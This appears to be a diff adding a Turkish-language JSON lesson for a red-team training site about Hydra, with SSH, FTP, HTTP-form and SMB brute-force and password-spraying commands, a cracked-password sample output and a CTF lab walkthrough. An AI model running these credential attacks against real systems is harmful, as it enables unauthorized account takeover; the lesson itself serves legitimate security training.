@@ -1,0 +1,121 @@
+{
+  "id": "hydra",
+  "slug": "hydra",
+  "title": "Hydra",
+  "subtitle": "Online Brute Force Aracı",
+  "description": "Hydra, çevrimiçi servislere (SSH, FTP, HTTP, SMB, RDP vb.) karşı paralel sözlük/brute force saldırıları yapan hızlı bir parola kırma aracıdır.",
+  "team": "red-team",
+  "category": "Parola Saldırıları",
+  "phase": "Exploitation",
+  "icon": "🔑",
+  "color": "#ef4444",
+  "tags": ["hydra", "brute force", "ssh", "ftp", "http", "password", "online"],
+  "modules": [
+    {
+      "id": "basics",
+      "title": "Temeller ve Servis Saldırıları",
+      "description": "Online brute force mantığı, kurulum ve SSH/FTP saldırıları",
+      "difficulty": "beginner",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Online Brute Force Mantığı",
+          "content": "**Hydra**, çalışan bir servise canlı parola denemeleri yapar (online). Hash kırma (offline) değil — gerçek servise bağlanır.\n\n**Dikkat edilmesi gerekenler:**\n- **Yavaş ve gürültülü:** Her deneme ağ üzerinden gider, loglanır\n- **Hesap kilitleme riski:** Çok deneme hesabı kilitleyebilir → önce parola politikasını öğren (enum4linux -P)\n- **Rate limiting:** Bazı servisler denemeyi yavaşlatır\n\n**Strateji:**\n- Önce kullanıcı adlarını enumeration ile bul\n- Hedefe özel/küçük wordlist kullan (rockyou başlangıç)\n- Password spraying (tek parola, çok kullanıcı) kilitlenmeyi tetiklemez\n\n**CTF ipucu:** SSH (22) veya FTP (21) açıksa ve kullanıcı adı biliniyorsa Hydra ilk seçenektir."
+        },
+        {
+          "id": "installation",
+          "type": "installation",
+          "title": "Kurulum",
+          "installation": {
+            "note": "Kali'de yüklü gelir.",
+            "linux": ["sudo apt install hydra -y", "hydra -h"]
+          }
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Servis Saldırıları",
+          "commands": [
+            {
+              "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1",
+              "description": "Tek kullanıcı (admin) için SSH parola saldırısı",
+              "output": "[22][ssh] host: 10.10.10.1 login: admin password: hunter2",
+              "tip": "Sonraki adım: bulunan parolayla ssh admin@10.10.10.1 ile bağlan.",
+              "flags": [
+                { "flag": "-l kullanıcı", "description": "Tek kullanıcı adı" },
+                { "flag": "-L dosya", "description": "Kullanıcı listesi" },
+                { "flag": "-p parola", "description": "Tek parola" },
+                { "flag": "-P dosya", "description": "Parola listesi" },
+                { "flag": "-t N", "description": "Paralel iş parçacığı (varsayılan 16)" },
+                { "flag": "-f", "description": "İlk eşleşmede dur" }
+              ]
+            },
+            {
+              "command": "hydra -L users.txt -P rockyou.txt ftp://10.10.10.1 -t 4 -f",
+              "description": "Kullanıcı listesiyle FTP saldırısı, 4 thread, ilk bulguda dur",
+              "tip": "SSH için -t değerini düşük tut (4); yüksek thread bağlantı reddine yol açabilir."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "advanced",
+      "title": "HTTP Form Saldırısı ve Lab",
+      "description": "Web login form brute force, password spraying ve pratik",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "HTTP ve İleri Kullanım",
+          "commands": [
+            {
+              "command": "hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
+              "description": "Web giriş formuna POST tabanlı saldırı",
+              "tip": "^USER^/^PASS^ değişkendir; son alan başarısız giriş mesajıdır (F=fail). Doğru mesajı Burp ile yakala.",
+              "flags": [
+                { "flag": "http-post-form", "description": "POST form saldırısı" },
+                { "flag": "http-get-form", "description": "GET form saldırısı" },
+                { "flag": ":F=metin", "description": "Başarısızlık göstergesi" },
+                { "flag": ":S=metin", "description": "Başarı göstergesi" }
+              ]
+            },
+            {
+              "command": "hydra -L users.txt -p 'Sonbahar2024!' 10.10.10.1 smb",
+              "description": "Password spraying — tüm kullanıcılara TEK parola dener",
+              "tip": "Spraying kilitlenmeyi tetiklemez (kullanıcı başına 1 deneme). Kurumsal ağlarda çok etkilidir."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: SSH Erişimi Kazanma",
+          "scenario": {
+            "title": "Enumeration → Brute Force → İlk Erişim",
+            "objective": "Hedefte SSH servisini bul, enumeration ile kullanıcı tespit et, Hydra ile parolayı kır ve sisteme giriş yap.",
+            "environment": "TryHackMe/HTB Linux makinesi",
+            "difficulty": "beginner",
+            "steps": [
+              "Port tara: nmap -p- -sV 10.10.10.1 (SSH'ı doğrula)",
+              "Kullanıcı bul: web/SMB enumeration veya bilinen kullanıcı",
+              "Saldırı: hydra -l bulunankullanici -P rockyou.txt ssh://10.10.10.1 -t 4 -f",
+              "Bağlan: ssh bulunankullanici@10.10.10.1",
+              "user.txt flag'ini oku, ardından privesc'e geç (LinPEAS)"
+            ],
+            "hints": [
+              "rockyou.txt çok büyük — hedefe özel küçük liste daha hızlı sonuç verir",
+              "Başarısızlık mesajını doğru yazmak HTTP saldırılarında kritiktir",
+              "Kilitlenme riskine karşı -t değerini düşük tut"
+            ],
+            "defenseNote": "Savunma: SSH'ta parola yerine anahtar tabanlı kimlik doğrulama, fail2ban ile otomatik IP banlama, MFA, root girişini kapatma ve güçlü parola politikası uygula."
+          }
+        }
+      ]
+    }
+  ]
+}
